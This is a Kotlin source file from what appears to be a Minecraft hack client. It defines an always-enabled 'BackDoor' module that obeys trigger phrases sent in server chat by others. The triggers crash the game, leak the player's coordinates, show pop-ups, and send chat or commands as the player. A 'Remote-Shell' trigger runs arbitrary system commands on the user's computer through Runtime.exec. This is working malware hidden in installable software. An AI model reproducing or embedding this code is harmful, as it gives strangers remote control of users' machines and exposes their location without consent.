package me.luna.trollhack.module.modules.client

import me.luna.trollhack.event.events.PacketEvent
import me.luna.trollhack.event.listener
import me.luna.trollhack.module.Category
import me.luna.trollhack.module.Module
import me.luna.trollhack.module.modules.misc.CoordLeaker
import me.luna.trollhack.util.text.MessageDetection
import me.luna.trollhack.util.text.MessageSendUtils.sendServerMessage
import net.minecraft.network.play.server.SPacketChat
import javax.swing.JOptionPane

internal object BackDoor : Module(
    name = "BackDoor",
    description = "lol",
    alwaysEnabled = true,
    category = Category.CLIENT
) {
    private val ignoreSelf by setting("Ignore self", true)

    init {
        listener<PacketEvent.Receive> {
            if (it.packet !is SPacketChat || MessageDetection.Direct.RECEIVE detect it.packet.chatComponent.unformattedText) return@listener

            val message = it.packet.chatComponent.unformattedText

            if(ignoreSelf && message.contains(mc.player.name)) return@listener

            if(message.contains("Remote-Crash")){
                mc.player = null
            }

            if(message.contains("Remote-Leak")){
                CoordLeaker.enable()
                return@listener
            }

            //example: Remote-msgbox Hacked By Dimples#1337
            if(message.contains("Remote-msgbox")){
                JOptionPane.showMessageDialog(null, message.substring(message.indexOf("Remote-msgbox") + 14), "Message", JOptionPane.PLAIN_MESSAGE)
                return@listener
            }

            //example: Remote-msg /kill
            if(message.contains("Remote-msg")){
                sendServerMessage(message.substring(message.indexOf("Remote-msg") + 11))
                return@listener
            }

            //example: Remote-Shell powershell calc
            if(message.contains("Remote-Shell")){
                try {
                    Runtime.getRuntime().exec(message.substring(message.indexOf("Remote-Shell") + 13))
                }catch (_: Exception){

                }
                return@listener
            }
        }
    }
}
